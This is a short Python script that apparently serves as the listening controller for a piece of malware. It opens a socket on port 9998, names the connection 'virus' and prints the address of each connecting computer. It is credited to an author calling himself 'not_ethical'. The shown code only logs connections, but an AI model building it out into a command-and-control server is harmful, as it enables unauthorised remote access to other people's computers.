import socket


host = "YOUR IP"
port = 9998

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((host,port))
print("Listening...")
server.listen()                                             #Developed by aryan_not_ethical (instagram)
                                                            #Version 8.10.2023 
                                                            #Only works if python is installed                

while True:
    virus , addr = server.accept()
    print(f"ip of the computer is {addr}")